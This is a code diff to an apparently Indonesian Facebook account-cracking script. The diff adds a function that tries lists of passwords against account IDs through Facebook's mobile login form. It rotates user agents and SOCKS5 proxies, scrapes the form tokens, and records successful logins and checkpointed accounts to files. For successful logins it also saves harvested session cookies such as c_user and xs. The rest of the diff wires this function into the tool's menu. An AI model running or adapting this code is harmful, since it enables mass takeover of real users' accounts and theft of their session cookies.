@@ -822,7 +822,7 @@ def setting():
 
 
     # Input untuk metode login
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]b-graph.facebook.com[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]IP[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
     fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
     if fankylog in ["1", "01"]:
         method.append("fankygraph")
@@ -960,9 +960,9 @@ def metslow():
                 if "fankygraph" in method:
                     pool.submit(fankygraphv1,idf,pwv,'graph.facebook.com')
                 elif "fankybapi" in method:
-                    pool.submit(fanb_graph,idf,pwv)
+                    pool.submit(fanky_b_api,idf,pwv)
                 else:
-                    pool.submit(fanb_graph,idf,pwv)
+                    pool.submit(fanky_b_api,idf,pwv)
                                     
                 	
                 	
@@ -1027,9 +1027,9 @@ def metcepat():
                 if "fankygraph" in method:
                     pool.submit(fankygraphv1,idf,pwv,'graph.facebook.com')
                 elif "fankybapi" in method:
-                    pool.submit(fanb_graph,idf,pwv)
+                    pool.submit(fanky_b_api,idf,pwv)
                 else:
-                    pool.submit(fanb_graph,idf,pwv)
+                    pool.submit(fanky_b_api,idf,pwv)
     print("")
     Console().print(
         Panel(
@@ -1208,7 +1208,53 @@ def fankygraphv1(idf, pwv, url):
     loop += 1
 
 #-------------------[ CRACK-MAIN ]------------#
-def fanky_b_api(idf, pwv):
+def fanky_b_api(idf,pwv):
+	global loop,ok,cp
+	rr = random.randint
+	rc = random.choice
+	bo = random.choice([m,k,h,b,u,x])
+	ua = random.choice(ugen) 
+	ses = requests.Session()
+	prog.update(des, description=f" {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des) 
+	for pw in pwv:
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
+			requ=ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
+			datasayainifanky = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1), "li": re.search('name="li" value="(.*?)"', requ.text).group(1), "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(requ.text)).group(1), "try_number": re.search('name="try_number" value="(.*?)"', str(requ.text)).group(1), "unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(requ.text)).group(1), "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(requ.text)).group(1), "__a": re.search('"encrypted":"(.*?)"', str(requ.text)).group(1), "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point", "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false", "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw}
+			kepalafanky= {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,id;q=0.8", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Referer": "https://iphone.facebook.com/", "Cache-Control": "max-age=0", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://iphone.facebook.com", "X-Requested-With": "XMLHttpRequest", "DNT": "1", "X-FB-HTTP-Engine": "Liger"}
+			fankyimut = "https://www.facebook.com/login/device-based/regular/login/"
+			po = session.post(fankyimut,headers=kepalafanky, data=datasayainifanky, allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				cp += 1
+				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok += 1
+				coki = ses.cookies.get_dict()
+				kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
+				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+
+def fanky_b_apiuii(idf, pwv):
     global loop, ok, cp
     rr = random.randint
     rc = random.choice
